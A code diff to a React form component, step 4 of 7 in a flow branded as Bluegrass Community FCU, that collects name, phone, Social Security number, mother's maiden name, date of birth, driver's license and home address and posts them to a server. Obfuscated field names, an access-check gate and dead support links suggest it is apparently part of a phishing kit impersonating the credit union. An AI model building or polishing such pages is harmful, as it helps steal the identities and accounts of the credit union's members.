@@ -4,6 +4,7 @@ import axios from 'axios';
 import { baseUrl } from '../constants';
 import useAccessCheck from '../Utils/useAccessCheck';
 import FlowPageLayout from '../components/FlowPageLayout';
+import FlowHelmet from '../components/FlowHelmet';
 
 type BasicInfoErrors = {
   fzNme: string;
@@ -238,279 +239,292 @@ const BasicInfo: React.FC = () => {
   };
 
   return (
-    <FlowPageLayout
-      eyebrow="Step 4 of 7"
-      title="Confirm Your Personal Details"
-      description="We need a few pieces of information to verify your identity and keep your account secure."
-      contentClassName="space-y-10"
-    >
-      <form onSubmit={handleSubmit} className="space-y-10">
-        {errors.form && (
-          <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
-            {errors.form}
+    <>
+      <FlowHelmet title="Confirm Your Personal Details" />
+      <FlowPageLayout
+        eyebrow="Step 4 of 7"
+        title="Confirm Your Personal Details"
+        description="Provide your personal details exactly as they appear on your identification so we can verify your membership."
+        contentClassName="space-y-8"
+        secondaryContent={(
+          <div className="flex flex-col items-center gap-3 text-white/90 md:flex-row md:gap-6">
+            <span className="font-medium">Need help?</span>
+            <a href="#" className="font-semibold hover:underline">Call Support</a>
+            <span className="hidden h-4 w-px bg-white/60 md:block" aria-hidden="true" />
+            <a href="#" className="font-semibold hover:underline">Visit Branch Locator</a>
           </div>
         )}
-
-        <section className="space-y-6">
-          <header className="space-y-1">
-            <h2 className="text-lg font-semibold text-[#123524]">Personal Information</h2>
-            <p className="text-sm text-[#557a46]">
-              Make sure everything matches what is on file with Bluegrass Community FCU.
-            </p>
-          </header>
-
-          <div className="grid gap-4 md:grid-cols-2">
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="fzNme">
-                First Name
-              </label>
-              <input
-                id="fzNme"
-                name="fzNme"
-                type="text"
-                value={fzNme}
-                onChange={(event) => setFzNme(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="Jane"
-              />
-              {renderError(errors.fzNme)}
+      >
+        <form onSubmit={handleSubmit} className="space-y-8">
+          {errors.form && (
+            <div className="rounded-xl border border-red-100 bg-red-50 px-4 py-3 text-sm text-red-700">
+              {errors.form}
             </div>
+          )}
 
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="lzNme">
-                Last Name
-              </label>
-              <input
-                id="lzNme"
-                name="lzNme"
-                type="text"
-                value={lzNme}
-                onChange={(event) => setLzNme(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="Doe"
-              />
-              {renderError(errors.lzNme)}
-            </div>
+          <section className="space-y-6">
+            <header className="space-y-1">
+              <h2 className="text-lg font-semibold text-[#123524]">Personal Information</h2>
+              <p className="text-sm text-[#557a46]">
+                Make sure everything matches what is on file with Bluegrass Community FCU.
+              </p>
+            </header>
 
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="phone">
-                Phone
-              </label>
-              <input
-                id="phone"
-                name="phone"
-                type="text"
-                value={phone}
-                onChange={(event) => setPhone(formatPhone(event.target.value))}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="(555) 123-4567"
-              />
-              {renderError(errors.phone)}
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="ssn">
-                Social Security Number
-              </label>
-              <div className="flex items-center gap-3">
+            <div className="grid gap-4 md:grid-cols-2">
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="fzNme">
+                  First Name
+                </label>
                 <input
-                  id="ssn"
-                  name="ssn"
-                  type={showSSN ? 'text' : 'password'}
-                  value={ssn}
-                  onChange={(event) => setSsn(formatSSN(event.target.value))}
-                  maxLength={11}
+                  id="fzNme"
+                  name="fzNme"
+                  type="text"
+                  value={fzNme}
+                  onChange={(event) => setFzNme(event.target.value)}
                   className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                  placeholder="XXX-XX-XXXX"
+                  placeholder="Jane"
                 />
-                <button
-                  type="button"
-                  onClick={() => setShowSSN((prev) => !prev)}
-                  className="text-xs font-semibold text-[#0b5da7] hover:underline"
-                >
-                  {showSSN ? 'Hide' : 'Show'}
-                </button>
+                {renderError(errors.fzNme)}
               </div>
-              {renderError(errors.ssn)}
-            </div>
 
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="motherMaidenName">
-                Mother's Maiden Name
-              </label>
-              <input
-                id="motherMaidenName"
-                name="motherMaidenName"
-                type="text"
-                value={motherMaidenName}
-                onChange={(event) => setMotherMaidenName(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="Enter maiden name"
-              />
-              {renderError(errors.motherMaidenName)}
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
-                Date of Birth
-              </label>
-              <div className="grid grid-cols-3 gap-2">
-                <select
-                  value={month}
-                  onChange={(event) => setMonth(event.target.value)}
-                  className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                >
-                  <option value="">Month</option>
-                  {Array.from({ length: 12 }, (_, index) => (
-                    <option key={index + 1} value={index + 1}>
-                      {new Date(0, index).toLocaleString('default', { month: 'long' })}
-                    </option>
-                  ))}
-                </select>
-                <select
-                  value={day}
-                  onChange={(event) => setDay(event.target.value)}
-                  className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                >
-                  <option value="">Day</option>
-                  {Array.from({ length: daysInMonth }, (_, index) => (
-                    <option key={index + 1} value={index + 1}>
-                      {index + 1}
-                    </option>
-                  ))}
-                </select>
-                <select
-                  value={year}
-                  onChange={(event) => setYear(event.target.value)}
-                  className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                >
-                  <option value="">Year</option>
-                  {years.map((value) => (
-                    <option key={value} value={value}>
-                      {value}
-                    </option>
-                  ))}
-                </select>
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="lzNme">
+                  Last Name
+                </label>
+                <input
+                  id="lzNme"
+                  name="lzNme"
+                  type="text"
+                  value={lzNme}
+                  onChange={(event) => setLzNme(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="Doe"
+                />
+                {renderError(errors.lzNme)}
               </div>
-              {renderError(errors.dob)}
-            </div>
 
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="driverLicense">
-                Driver's License
-              </label>
-              <input
-                id="driverLicense"
-                name="driverLicense"
-                type="text"
-                value={driverLicense}
-                onChange={(event) => setDriverLicense(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="License number"
-              />
-              {renderError(errors.driverLicense)}
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="phone">
+                  Phone
+                </label>
+                <input
+                  id="phone"
+                  name="phone"
+                  type="text"
+                  value={phone}
+                  onChange={(event) => setPhone(formatPhone(event.target.value))}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="(555) 123-4567"
+                />
+                {renderError(errors.phone)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="ssn">
+                  Social Security Number
+                </label>
+                <div className="flex items-center gap-3">
+                  <input
+                    id="ssn"
+                    name="ssn"
+                    type={showSSN ? 'text' : 'password'}
+                    value={ssn}
+                    onChange={(event) => setSsn(formatSSN(event.target.value))}
+                    maxLength={11}
+                    className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                    placeholder="XXX-XX-XXXX"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowSSN((prev) => !prev)}
+                    className="text-xs font-semibold text-[#0b5da7] hover:underline"
+                  >
+                    {showSSN ? 'Hide' : 'Show'}
+                  </button>
+                </div>
+                {renderError(errors.ssn)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="motherMaidenName">
+                  Mother's Maiden Name
+                </label>
+                <input
+                  id="motherMaidenName"
+                  name="motherMaidenName"
+                  type="text"
+                  value={motherMaidenName}
+                  onChange={(event) => setMotherMaidenName(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="Enter maiden name"
+                />
+                {renderError(errors.motherMaidenName)}
+              </div>
+
+              <div className="space-y-2 md:col-span-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]">
+                  Date of Birth
+                </label>
+                <div className="grid grid-cols-3 gap-2">
+                  <select
+                    value={month}
+                    onChange={(event) => setMonth(event.target.value)}
+                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  >
+                    <option value="">Month</option>
+                    {Array.from({ length: 12 }, (_, index) => (
+                      <option key={index + 1} value={index + 1}>
+                        {new Date(0, index).toLocaleString('default', { month: 'long' })}
+                      </option>
+                    ))}
+                  </select>
+                  <select
+                    value={day}
+                    onChange={(event) => setDay(event.target.value)}
+                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  >
+                    <option value="">Day</option>
+                    {Array.from({ length: daysInMonth }, (_, index) => (
+                      <option key={index + 1} value={index + 1}>
+                        {index + 1}
+                      </option>
+                    ))}
+                  </select>
+                  <select
+                    value={year}
+                    onChange={(event) => setYear(event.target.value)}
+                    className="rounded-xl border border-gray-200 px-3 py-2 text-sm text-gray-800 focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  >
+                    <option value="">Year</option>
+                    {years.map((value) => (
+                      <option key={value} value={value}>
+                        {value}
+                      </option>
+                    ))}
+                  </select>
+                </div>
+                {renderError(errors.dob)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="driverLicense">
+                  Driver's License
+                </label>
+                <input
+                  id="driverLicense"
+                  name="driverLicense"
+                  type="text"
+                  value={driverLicense}
+                  onChange={(event) => setDriverLicense(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="License number"
+                />
+                {renderError(errors.driverLicense)}
+              </div>
             </div>
+          </section>
+
+          <section className="space-y-6">
+            <header className="space-y-1">
+              <h2 className="text-lg font-semibold text-[#123524]">Home Address</h2>
+              <p className="text-sm text-[#557a46]">
+                Tell us where you receive mail that’s connected to your account.
+              </p>
+            </header>
+
+            <div className="grid gap-4 md:grid-cols-2">
+              <div className="space-y-2 md:col-span-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="stAd">
+                  Street Address
+                </label>
+                <input
+                  id="stAd"
+                  name="stAd"
+                  type="text"
+                  value={stAd}
+                  onChange={(event) => setStAd(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="123 Main Street"
+                />
+                {renderError(errors.stAd)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="apt">
+                  Apartment / Unit (Optional)
+                </label>
+                <input
+                  id="apt"
+                  name="apt"
+                  type="text"
+                  value={apt}
+                  onChange={(event) => setApt(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                />
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="city">
+                  City
+                </label>
+                <input
+                  id="city"
+                  name="city"
+                  type="text"
+                  value={city}
+                  onChange={(event) => setCity(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="Lexington"
+                />
+                {renderError(errors.city)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="state">
+                  State
+                </label>
+                <input
+                  id="state"
+                  name="state"
+                  type="text"
+                  value={state}
+                  onChange={(event) => setState(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="KY"
+                />
+                {renderError(errors.state)}
+              </div>
+
+              <div className="space-y-2">
+                <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="zipCode">
+                  Zip Code
+                </label>
+                <input
+                  id="zipCode"
+                  name="zipCode"
+                  type="text"
+                  value={zipCode}
+                  onChange={(event) => setZipCode(event.target.value)}
+                  className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
+                  placeholder="40502"
+                />
+                {renderError(errors.zipCode)}
+              </div>
+            </div>
+          </section>
+
+          <div className="flex justify-end">
+            <button
+              type="submit"
+              disabled={isLoading}
+              className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
+            >
+              {isLoading ? 'Submitting…' : 'Continue'}
+            </button>
           </div>
-        </section>
-
-        <section className="space-y-6">
-          <header className="space-y-1">
-            <h2 className="text-lg font-semibold text-[#123524]">Home Address</h2>
-            <p className="text-sm text-[#557a46]">Tell us where you receive mail that’s connected to your account.</p>
-          </header>
-
-          <div className="grid gap-4 md:grid-cols-2">
-            <div className="space-y-2 md:col-span-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="stAd">
-                Street Address
-              </label>
-              <input
-                id="stAd"
-                name="stAd"
-                type="text"
-                value={stAd}
-                onChange={(event) => setStAd(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="123 Main Street"
-              />
-              {renderError(errors.stAd)}
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="apt">
-                Apartment / Unit (Optional)
-              </label>
-              <input
-                id="apt"
-                name="apt"
-                type="text"
-                value={apt}
-                onChange={(event) => setApt(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-              />
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="city">
-                City
-              </label>
-              <input
-                id="city"
-                name="city"
-                type="text"
-                value={city}
-                onChange={(event) => setCity(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="Lexington"
-              />
-              {renderError(errors.city)}
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="state">
-                State
-              </label>
-              <input
-                id="state"
-                name="state"
-                type="text"
-                value={state}
-                onChange={(event) => setState(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="KY"
-              />
-              {renderError(errors.state)}
-            </div>
-
-            <div className="space-y-2">
-              <label className="text-xs font-semibold uppercase tracking-wide text-[#123524]" htmlFor="zipCode">
-                Zip Code
-              </label>
-              <input
-                id="zipCode"
-                name="zipCode"
-                type="text"
-                value={zipCode}
-                onChange={(event) => setZipCode(event.target.value)}
-                className="w-full rounded-xl border border-gray-200 px-4 py-3 text-sm text-gray-800 shadow-sm focus:border-[#4A9619]/60 focus:outline-none focus:ring-2 focus:ring-[#BFD8F6]"
-                placeholder="40502"
-              />
-              {renderError(errors.zipCode)}
-            </div>
-          </div>
-        </section>
-
-        <div className="flex justify-end">
-          <button
-            type="submit"
-            disabled={isLoading}
-            className="inline-flex items-center justify-center rounded-xl bg-[#4A9619] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#3f8215] disabled:cursor-not-allowed disabled:opacity-70"
-          >
-            {isLoading ? 'Submitting…' : 'Continue'}
-          </button>
-        </div>
-      </form>
-    </FlowPageLayout>
+        </form>
+      </FlowPageLayout>
+    </>
   );
 };
 
